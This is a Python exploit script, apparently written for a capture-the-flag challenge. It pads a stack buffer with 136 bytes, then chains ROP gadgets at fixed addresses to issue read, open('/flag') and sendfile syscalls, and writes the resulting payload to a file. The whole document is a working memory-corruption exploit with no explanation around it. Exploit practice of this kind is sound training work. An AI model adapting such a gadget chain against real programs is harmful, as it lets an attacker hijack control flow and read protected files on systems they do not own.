#!/usr/bin/env python3

from struct import pack

payload = b'a' * 136

# 0x404040 is the address of a global variable.
# read(0, 0x404040, 5);
payload += pack("<Q", 0x401a67) # pop rax ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401a5e) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401a76) # pop rsi ; ret
payload += pack("<Q", 0x404040) # data
payload += pack("<Q", 0x401a46) # pop rdx ; ret
payload += pack("<Q", 5)        # data
payload += pack("<Q", 0x401a3e) # syscall ; ret

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x401a67) # pop rax ; ret
payload += pack("<Q", 2)        # data
payload += pack("<Q", 0x401a5e) # pop rdi ; ret
payload += pack("<Q", 0x404040) # data
payload += pack("<Q", 0x401a76) # pop rsi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401a3e) # syscall ; ret

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x401a67) # pop rax ; ret
payload += pack("<Q", 40)       # data
payload += pack("<Q", 0x401a5e) # pop rdi ; ret
payload += pack("<Q", 1)        # data
payload += pack("<Q", 0x401a76) # pop rsi ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x401a46) # pop rdx ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x401a56) # pop r10 ; ret
payload += pack("<Q", 400)      # data
payload += pack("<Q", 0x401a3e) # syscall ; ret

with open("payload", "wb") as f:
    f.write(payload)
